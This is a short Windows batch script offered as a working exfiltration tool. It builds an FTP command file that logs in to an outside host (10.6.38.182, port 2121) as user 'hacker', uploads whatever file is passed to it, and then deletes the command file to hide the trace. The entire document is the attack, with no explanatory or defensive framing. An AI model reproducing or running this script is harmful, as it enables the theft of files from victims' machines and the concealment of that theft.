@echo off
echo open 10.6.38.182 2121> ftpcmd.dat
echo user hacker>> ftpcmd.dat
echo g0tPwned>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat